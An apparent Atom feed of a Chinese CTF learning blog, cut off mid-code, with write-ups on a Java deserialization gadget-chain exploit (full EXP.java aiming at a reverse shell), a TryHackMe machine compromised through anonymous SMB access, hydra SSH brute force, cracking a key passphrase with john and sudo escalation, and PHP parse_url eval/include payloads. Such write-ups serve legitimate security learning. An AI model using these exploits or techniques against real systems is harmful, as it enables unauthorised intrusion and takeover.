<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-05-22T10:12:54.405Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java-反序列化题目</title>
    <link href="https://ke1nys.github.io/posts/450c467.html"/>
    <id>https://ke1nys.github.io/posts/450c467.html</id>
    <published>2023-05-22T06:43:58.000Z</published>
    <updated>2023-05-22T10:12:54.405Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是记录一下关于java反序列化的刷题</p><p><strong>(因为刚把一些链子给跟完)</strong></p><h2 id="东华杯ezgadget"><a href="#东华杯ezgadget" class="headerlink" title="东华杯ezgadget"></a>东华杯ezgadget</h2><p>原题的jar包 可以把代码拷出来自己跑下<br>链接：<a href="https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw">https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw</a><br>提取码：8do5</p><p><code>java -jar ezgadget.jar</code>在kali或者自己的服务器上运行跑一下，搭建一个环境</p><p>拿到jar包后先放到<strong>jd-gui</strong>里面进行反编译一下</p><p>然后在导到idea进行测试(<strong>这里的话是得根据题目自己创建package来导入</strong>)</p><p><img src="../images/image-20230522161955641.png" alt="image-20230522161955641"></p><p>导入到idea里后，进行代码审计</p><p>先是查看<code>pom.xml</code>看有无一些常见链子的依赖</p><p><img src="../images/image-20230522162058331.png" alt="image-20230522162058331"></p><p>这里的话是没有</p><p><strong>Tools.java</strong></p><p><img src="../images/image-20230522162207881.png" alt="image-20230522162207881"></p><p>这里提供了他一些函数是进行base64编码和解码的，还有序列化和反序列化的</p><p><strong>IndexController.java</strong></p><p><img src="../images/image-20230522163815734.png" alt="image-20230522163815734"></p><p><strong>TostringBean.java</strong></p><p><img src="../images/image-20230522162343938.png" alt="image-20230522162343938"></p><p>这里话是提供了一个动态类加载的<code>defineClass</code>方法     并且还会实例化</p><p>这里话就说明了这道题是不出网的，得在自己本地执行编译过的恶意代码</p><p>那么我们就得找一下谁调用了这个<code>TostringBean.toString()</code>方法</p><p>这里如果对cc链比较熟悉的话，一下就能猜出来了</p><p><img src="../images/image-20230522163614748.png" alt="image-20230522163614748"></p><p>cc5这条链子就有一个类的<code>readObject</code>方法是调用这个<code>toSting</code>方法的</p><p>于是调用链就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readobject  --&gt; ToStringBean.toString</span><br></pre></td></tr></table></figure><p>于是我们就开始写exp</p><p>这里的话先从执行代码那部分开始写</p><p><img src="../images/image-20230522164138690.png" alt="image-20230522164138690"></p><p>这里话是得使用反射调用来给这个参数赋值</p><p><strong>这里附的值就是我们本地的编译过的恶意代码</strong></p><p><img src="../images/image-20230522164815484.png" alt="image-20230522164815484"></p><p><img src="../images/image-20230522165301451.png" alt="image-20230522165301451"></p><p>然后就把执行代码的这部分写完了</p><p>接下来就是写使用<code>BadAttributeValueExpException.readobject</code>来触发<code>toString</code>这个函数了</p><p>先跟进去看一下这个类</p><p><strong>先看他的构造函数</strong></p><p><img src="../images/image-20230522165750768.png" alt="image-20230522165750768"></p><p>在实例化的时候会执行这个方法，赋值就会执行toString方法，但是这里我们不能直接传Tostingbean方法，因为如果这里进行了调用了话，readobject方法的时候在调用会报错</p><p>所以这里的我们在实例化的时候就随便传一个值。</p><p><strong>在看一下他的readobject方法</strong></p><p><img src="../images/image-20230522165951342.png" alt="image-20230522165951342"></p><p>就是会获取val这个参数的值并赋给valObj这个参数，然后在最后的时候就会调用valObj.toString()方法</p><p>所以关键点就在这个val参数这里，这里的话我们就可以考虑使用反射调用来进行修改这里的值</p><p><img src="../images/image-20230522170424460.png" alt="image-20230522170424460"></p><p>这样就写好了</p><p>然后因为在这个/readobject路由里还得满足一些要求才能进行反序列化</p><p><img src="../images/image-20230522170453923.png" alt="image-20230522170453923"></p><p><img src="../images/image-20230522170752259.png" alt="image-20230522170752259"></p><p>这样就全部写完了</p><p>但是这里得需要先进行解码，所以我们还得对字节流进行编码</p><p><img src="../images/image-20230522170835166.png" alt="image-20230522170835166"></p><p><img src="../images/image-20230522171128098.png" alt="image-20230522171128098"></p><p>进行了编码</p><p>然后输出</p><p><img src="../images/image-20230522172417365.png" alt="image-20230522172417365"></p><p>然后将编码后的结果进行<strong>url编码</strong>，然后data传参就行了(<strong>必须得进行url编码 </strong>)</p><p>就可以成功反弹shell了</p><p><strong>EXP.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> toStringBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea\\IntelliJ IDEA Community Edition 2022.3.1\\project\\ezgadget\\target\\classes\\com\\ezgame\\ctf\\payload.class&quot;</span>));</span><br><span class="line">        field.set(toStringBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123123123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Tools.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>妈的  吐槽一下  这里的话得需要jdk1.8来运行jar包   如果用jdk17的话   会shell弹不上去</strong>(这里卡了好久，晕了)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是记录一下关于java反序列化的刷题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(因为刚把一些链子给跟完)&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;东华杯ezgadget&quot;&gt;&lt;a href=&quot;#东华杯ezgadget&quot; class=&quot;headerlink&quot; title=&quot;东华</summary>
      
    
    
    
    
    <category term="java-反序列化题目" scheme="https://ke1nys.github.io/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>thm-Basic Pentesting</title>
    <link href="https://ke1nys.github.io/posts/4f9775c1.html"/>
    <id>https://ke1nys.github.io/posts/4f9775c1.html</id>
    <published>2023-05-21T08:35:12.000Z</published>
    <updated>2023-05-21T14:28:20.543Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下</p><p>老样子还是先扫一下端口</p><p><img src="../images/image-20230521164057332.png" alt="image-20230521164057332"></p><p>扫出了这些端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">8009</span><br><span class="line">8080</span><br></pre></td></tr></table></figure><p>接下来访问80端口</p><p><img src="../images/image-20230521164222216.png" alt="image-20230521164222216"></p><p>没收集到啥有用的信息，扫个目录看看</p><p><img src="../images/image-20230521164453614.png" alt="image-20230521164453614"></p><p>发现一个development目录  于是进行访问</p><p><img src="../images/image-20230521164535782.png" alt="image-20230521164535782"></p><p>发现两个文件</p><p>dev.txt</p><p><img src="../images/image-20230521164625273.png" alt="image-20230521164625273"></p><p>j.txt</p><p><img src="../images/image-20230521164734023.png" alt="image-20230521164734023"></p><p>所以我们在 dev 中打开这两个文本文件，我们可以看到消息是关于一些 apache struts 和 2.5.12 版本的，而 j.txt 文件是关于机器内部哈希密码的目录。所以现在让我们考虑一下 Apache struts 2.5.12 版本，我们用 google 搜索了 Apache struts 2.15.12 以找到一些漏洞，我们得到了一个可以利用的 Metasploit 模块，但在尝试之后并没有给我一个连接。</p><p>我们无法从 Metasploit 模块获得反向 shell</p><p>现在让我们回到 Nmap 脚本，结果显示我们打开了 SMB 端口，我们也有 SMB 版本如果 SMB 版本存在漏洞，让我们谷歌一下</p><p>经过一些研究，我们得到了 <strong>Enum4linux—— <em>Enum4linux</em></strong>是一个用于从 Windows 和 <strong>Samba</strong> 系统枚举信息的工具。</p><p>所以现在我们可以运行命令“Enum4linux -a ipaddress”</p><p><img src="../images/image-20230521165356870.png" alt="image-20230521165356870"></p><p>成功找到这两个用户名，这里还有一种方法就是尝试一一下<strong>smb匿名用户登录</strong></p><p><code>smbclient //10.10.245.61/anonymous</code></p><p><img src="../images/image-20230521165706991.png" alt="image-20230521165706991"></p><p>直接匿名登录成功了</p><p><img src="../images/image-20230521165802097.png" alt="image-20230521165802097"></p><p>这也可以成功拿到名字，接下来就是尝试爆破ssh密码了</p><p>使用的是<code>hydra</code>工具  也叫九头蛇</p><p><img src="../images/image-20230521170726504.png" alt="image-20230521170726504"></p><p>使用这个工具，然后爆破出 <code>jan</code>的密码为<code>armando</code></p><p>于是进行登录</p><p><img src="../images/image-20230521170849656.png" alt="image-20230521170849656"></p><p>成功进行登录</p><p><img src="../images/image-20230521171014069.png" alt="image-20230521171014069"></p><p>发现jan用户没有权限查看kay用户目录下的文件，于是我们就尝试收集一些信息来尝试登录kay用户</p><p><img src="../images/image-20230521171101435.png" alt="image-20230521171101435"></p><p>发现存在<code>.ssh</code>文件</p><p>ssh进行免密登录的要求是<strong>私钥</strong>(<code>id_rsa</code>)要在客户段，<strong>公钥</strong>(<code>id_rsa.pub</code>)在服务端</p><p>在谷歌上搜索后我们知道这个 SSH 密钥可以用 John the ripper 破解。因此，让我们尝试破解 SSH 密钥。</p><p>所以首先我们必须找到 ssh2john.py 来转换哈希并将“id_rsa”文件内容作为文本文件复制并保存到我们的计算机，我们必须将文本文件转换为哈希格式你可以使用如图所示的命令在下图中</p><p><img src="../images/image-20230521172330697.png" alt="image-20230521172330697"></p><p>直接使用.ssh里的id_rsa是登不上去的，得需要john进行破解密码</p><p><img src="../images/image-20230521173041417.png" alt="image-20230521173041417"></p><p>这里是因为使用id_rsa受到密码保护，得输入密码才能使用，所以这里就得需要john进行密码的破解</p><p><strong>john的用法就是把需要破解的东西先转为它能识别的样子，然后在进行破解</strong></p><p>最后爆破出来的密码是<code>beeswax</code></p><p><img src="../images/image-20230521173425039.png" alt="image-20230521173425039"></p><p>成功进行登录</p><p><img src="../images/image-20230521173631270.png" alt="image-20230521173631270"></p><p>然后使用sudo -l来进行查看，发现kay用户可以访问所有的sudo命令</p><p><code>sudo su</code>进行提权</p><p><img src="../images/image-20230521173743387.png" alt="image-20230521173743387"></p><p><strong>总结</strong></p><p><strong>这里的学习到了遇到smb协议的时候该怎么办</strong></p><p><strong>还有使用john来破解id_rsa的使用密码</strong></p><p><strong>感觉john是不是啥密码都能进行爆破</strong> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下&lt;/p&gt;
&lt;p&gt;老样子还是先扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521164057332.png&quot; alt=&quot;image-2023</summary>
      
    
    
    
    
    <category term="thm-Basic Pentesting" scheme="https://ke1nys.github.io/tags/thm-Basic-Pentesting/"/>
    
  </entry>
  
  <entry>
    <title>show-代码执行</title>
    <link href="https://ke1nys.github.io/posts/2e4c90e3.html"/>
    <id>https://ke1nys.github.io/posts/2e4c90e3.html</id>
    <published>2023-05-20T13:06:08.000Z</published>
    <updated>2023-05-23T07:37:10.658Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="afd8626805df0a076cc1561e36377044514cd3054efa72ff9b16cd6df3a825e4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-代码执行" scheme="https://ke1nys.github.io/tags/show-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc2+cc4+cc5+cc7</title>
    <link href="https://ke1nys.github.io/posts/858f6c3d.html"/>
    <id>https://ke1nys.github.io/posts/858f6c3d.html</id>
    <published>2023-05-19T13:11:01.000Z</published>
    <updated>2023-05-21T14:28:20.538Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是导入cc4的maven依赖</p><p><img src="../images/image-20230521192554529.png" alt="image-20230521192554529"></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>这里cc4和前面的不同是在调用<code>transform</code>方法的不同</p><p><img src="../images/image-20230521194855536.png" alt="image-20230521194855536"></p><p>然后就是接着找谁能调用这个<code>compare</code>方法了</p><p>根据发现这条链子的作者写的文章来看</p><p>入口点是<code>PriorityQueue</code>这个类</p><p><img src="../images/image-20230521195351157.png" alt="image-20230521195351157"></p><p>然后就到<code>heapify()</code></p><p><img src="../images/image-20230521195429690.png" alt="image-20230521195429690"></p><p>然后接着是<code>siftDown</code>函数</p><p><img src="../images/image-20230521195509503.png" alt="image-20230521195509503"></p><p>然后接着是<code>siftDownUsingComparator</code>函数</p><p><img src="../images/image-20230521195535898.png" alt="image-20230521195535898"></p><p>这里的话就和上面的方法对应上了</p><p>这里的话都是在<code>PriorityQueue</code>这个类里边进行调用那么因为<code>comparator</code>参数可控，所以就可以直接调用<code>TransformingComparator.compare()</code>方法了，然后就可以调用这个方法里边的<code>transform</code>方法了</p><p>最终目的都是为了调用到<code>ChainedTransformer.transform</code>方法</p><p>这里的话就会有疑问，就是为什么这里的链子在<strong>cc3</strong>里不能用，<code>PriorityQueue</code>是jdk里的类，那么出问题的肯定不是他，而是<code>TransformingComparator</code>这个类的问题</p><p><img src="../images/image-20230521202532028.png" alt="image-20230521202532028"></p><p><img src="../images/image-20230521202543387.png" alt="image-20230521202543387"></p><p>就是因为cc3里的这个类没有继承<code>serialize</code>所以就不能进行序列化操作，所以问题就出现在这里了</p><p>这里因为啥设的这些参数我这里就不写了  <a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频这里有讲</a></p><p><strong>接下来就懒得跟了，就是修改调用<code>transform</code>方法的变式罢了</strong></p><p><img src="../images/image-20221010090837206.png" alt="img"></p><p>就是跟着这张图片来找就行了</p><p>cc链子可以用很多种方法来互相组合来进行调用，就是可以用执行代码和调用<code>transform</code>的方法来进行排列组合掉用</p><p><strong>理论上应该只有1和3受jdk版本影响</strong></p><p><a href="http://miku233.viewofthai.link/2022/10/10/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这是b站评论大佬写的总结</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">b站视频</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是导入cc4的maven依赖&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521192554529.png&quot; alt=&quot;image-20230521192554529&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;CC4&quot;&gt;&lt;a href=&quot;#CC4&quot;</summary>
      
    
    
    
    
    <category term="java反序列化-cc2+cc4+cc5+cc7" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2-cc4-cc5-cc7/"/>
    
  </entry>
  
  <entry>
    <title>java-二次反序列化</title>
    <link href="https://ke1nys.github.io/posts/6c257651.html"/>
    <id>https://ke1nys.github.io/posts/6c257651.html</id>
    <published>2023-05-17T08:51:44.000Z</published>
    <updated>2023-05-17T12:28:35.161Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://tttang.com/archive/1701/#toc_">二次反序列化</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://tttang.com/archive/1701/#toc_&quot;&gt;二次反序列化&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="java-二次反序列化" scheme="https://ke1nys.github.io/tags/java-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-周末大挑战-parse_url</title>
    <link href="https://ke1nys.github.io/posts/153b575d.html"/>
    <id>https://ke1nys.github.io/posts/153b575d.html</id>
    <published>2023-05-15T09:42:21.000Z</published>
    <updated>2023-05-16T07:46:06.509Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe">官方wp</a></p><p><strong>看了wp之后，学到了一个新技巧</strong></p><p>就是在<code>/</code>用不了的时候，我们可以使用先进行编码，然后在进行解码的方式来进行绕过</p><p>例如   <code>eval(base64_decode(&#39;c3lzdGVtKCJscyAvIik7&#39;));</code></p><p>这里的话先介绍一下这个<code>parse_url</code>函数</p><p>这里话在ctfshow的web入门里也有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://user:pass@host/path?args=value#anch&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果--------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; host</span><br><span class="line">    [user] =&gt; user</span><br><span class="line">    [pass] =&gt; pass</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; args=value</span><br><span class="line">    [fragment] =&gt; anch</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-10 10:58:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的host的话就是<code>http://xxxx/</code>   里面的xxx，那么这里可控，于是就尝试看能不能进行命令执行</p><p><img src="../images/image-20230515175832497.png" alt="image-20230515175832497"></p><p>能成功进行命令执行，于是尝试文件读取</p><p><img src="../images/image-20230515180225448.png" alt="image-20230515180225448"></p><p>这是其中一种解法</p><p><strong>这里的 <code>/</code>用不了是因为在/的后面会被<code>parse_url</code>解析成path</strong></p><p><img src="../images/image-20230515180454024.png" alt="image-20230515180454024"></p><p>这是第二种解法</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:25:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>做这里的时候可以使用bp来做，hackbar可能识别不成功</p><p>这里的想法是构造<code>php://input</code></p><p><img src="../images/image-20230516143313335.png" alt="image-20230516143313335"></p><p>这里的host是<code>php:</code>   path是<code>//input</code></p><p>然后就可以拼接成<code>include php://input</code>   、</p><p>然后在post执行代码就能够成功执行了</p><p><img src="../images/image-20230516143456418.png" alt="image-20230516143456418"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>还是考察的拼接方法</p><p><img src="../images/image-20230516143959148.png" alt="image-20230516143959148"></p><p>本地尝试了一下</p><p><img src="../images/image-20230516144016789.png" alt="image-20230516144016789"></p><p>可以成功命令执行了</p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 